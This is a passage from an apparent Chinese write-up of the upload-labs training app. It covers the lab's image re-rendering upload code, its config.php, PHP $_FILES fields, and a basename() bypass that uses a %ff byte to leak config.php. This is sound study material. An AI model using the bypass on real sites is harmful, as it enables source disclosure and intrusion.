class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 获得上传文件的扩展名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$fileext&lt;/span&gt;= &lt;span class=&#34;title function_ invoke__&#34;&gt;substr&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;strrchr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//判断文件后缀与类型，合法才进行上传操作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;((&lt;span class=&#34;variable&#34;&gt;$fileext&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;quot;jpg&amp;quot;&lt;/span&gt;) &amp;amp;&amp;amp; (&lt;span class=&#34;variable&#34;&gt;$filetype&lt;/span&gt;==&lt;span class=&#34;string&#34;&gt;&amp;quot;image/jpeg&amp;quot;&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$tmpname&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;//使用上传的图片生成新的图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;imagecreatefromjpeg&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt; == &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;该文件不是jpg格式的图片！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @&lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//给新图片指定文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;title function_ invoke__&#34;&gt;srand&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;time&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$newfilename&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strval&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;rand&lt;/span&gt;()).&lt;span class=&#34;string&#34;&gt;&amp;quot;.jpg&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//显示二次渲染后的图片（使用用户上传图片生成的新图片）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$newfilename&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;title function_ invoke__&#34;&gt;imagejpeg&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @&lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;上传出错！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;((&lt;span class=&#34;variable&#34;&gt;$fileext&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;quot;png&amp;quot;&lt;/span&gt;) &amp;amp;&amp;amp; (&lt;span class=&#34;variable&#34;&gt;$filetype&lt;/span&gt;==&lt;span class=&#34;string&#34;&gt;&amp;quot;image/png&amp;quot;&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$tmpname&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;//使用上传的图片生成新的图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;imagecreatefrompng&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt; == &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;该文件不是png格式的图片！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @&lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 &lt;span class=&#34;comment&#34;&gt;//给新图片指定文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;title function_ invoke__&#34;&gt;srand&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;time&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$newfilename&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strval&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;rand&lt;/span&gt;()).&lt;span class=&#34;string&#34;&gt;&amp;quot;.png&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//显示二次渲染后的图片（使用用户上传图片生成的新图片）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$newfilename&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;title function_ invoke__&#34;&gt;imagepng&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @&lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;               &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;上传出错！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;((&lt;span class=&#34;variable&#34;&gt;$fileext&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;quot;gif&amp;quot;&lt;/span&gt;) &amp;amp;&amp;amp; (&lt;span class=&#34;variable&#34;&gt;$filetype&lt;/span&gt;==&lt;span class=&#34;string&#34;&gt;&amp;quot;image/gif&amp;quot;&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$tmpname&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;//使用上传的图片生成新的图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;imagecreatefromgif&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt; == &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;该文件不是gif格式的图片！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @&lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//给新图片指定文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;title function_ invoke__&#34;&gt;srand&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;time&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$newfilename&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strval&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;rand&lt;/span&gt;()).&lt;span class=&#34;string&#34;&gt;&amp;quot;.gif&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//显示二次渲染后的图片（使用用户上传图片生成的新图片）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$newfilename&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;title function_ invoke__&#34;&gt;imagegif&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$im&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @&lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$target_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;上传出错！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里首先更新一下对于某些php代码细节的问题：&lt;/p&gt;
&lt;p&gt;①对于&lt;code&gt;name&lt;/code&gt;和&lt;code&gt;tmp_name&lt;/code&gt;两个字段的理解&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004110008338.png&#34; alt=&#34;image-20221004110008338&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看出&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$_FILES[&amp;#39;upload_file&amp;#39;[&amp;#39;name&amp;#39;]&lt;/code&gt;获取到的是文件原始名称（&lt;strong&gt;不带路径，只有文件名&lt;/strong&gt;）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;]&lt;/code&gt;则是获取该文件在上传到服务器后的临时文件名（&lt;strong&gt;带绝对路径&lt;/strong&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;②UPLOAD_PATH，为什么大写？这是什么东西？&lt;/p&gt;
&lt;p&gt;可以在 &lt;code&gt;C:\phpStudyB\WWW\upload-labs-0.1\config.php&lt;/code&gt;中看到如下&lt;code&gt;宏定义&lt;/code&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-type: text/html;charset=utf-8&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;error_reporting&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;define&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;WWW_ROOT&amp;quot;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;DOCUMENT_ROOT&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;define&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;APP_ROOT&amp;quot;&lt;/span&gt;,&lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\\&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;title function_ invoke__&#34;&gt;dirname&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;define&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;APP_URL_ROOT&amp;quot;&lt;/span&gt;,&lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(WWW_ROOT,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,APP_ROOT));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//文件包含漏洞页面&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;define&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;INC_VUL_PATH&amp;quot;&lt;/span&gt;,APP_URL_ROOT . &lt;span class=&#34;string&#34;&gt;&amp;quot;/include.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//设置上传目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;define&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;UPLOAD_PATH&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;../upload&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;UPLOAD_PATH是我们自定义的一个宏，它代表着&lt;code&gt;WWW&lt;/code&gt;根目录下的&lt;code&gt;upload/&lt;/code&gt;子目录&lt;/p&gt;
&lt;p&gt;③basename() 函数返回路径中的文件名部分&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;参数&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;path&lt;/strong&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;必需。规定要检查的路径。&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;suffix&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;可选。规定文件扩展名。如果文件有 suffix，则不会输出这个扩展名。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$path&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;/testweb/home.php&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Show filename with file extension&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;basename&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$path&lt;/span&gt;) .&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Show filename without file extension&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;basename&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$path&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输出结果&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; home.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt; home&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里简单介绍下绕过basename()原理:&lt;/p&gt;
&lt;p&gt;其实就是匹配最后一个&lt;code&gt;/（斜杠）&lt;/code&gt;，然后截取&lt;code&gt;/（斜杠）&lt;/code&gt;右侧的字符串输出&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;basename&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;index.php/config.php?source&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;&amp;gt; config.php?source&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;basename&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;index.php/config.php/?source&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;&amp;gt; ?source&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在使用默认语言环境设置时，basename() 会&lt;strong&gt;删除&lt;/strong&gt;文件名开头的非 ASCII 字符。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当斜杠右侧的字符ascii值为47、129-255时，basename会解析回上一个目录，将其当成文件名输出&lt;ul&gt;
&lt;li&gt;例如：&lt;code&gt;http://127.0.0.1/basename_pass/index.php/config.php/%ff?source&lt;/code&gt;，&lt;code&gt;basename()&lt;/code&gt;会返回&lt;code&gt;config.php&lt;/code&gt;而不是&lt;code&gt;?source&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其中47对应的符号为’/‘，在实际场景中没有利用价值&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;同时可能还会伴随着&lt;code&gt;$_SERVER[&amp;#39;PHP_SELF&amp;#39;]&lt;/code&gt;的使用，&lt;code&gt;PHP_SELF是输出当前php文件相当于根目录的路径&lt;/code&gt;(不带参数)&lt;/p&gt;
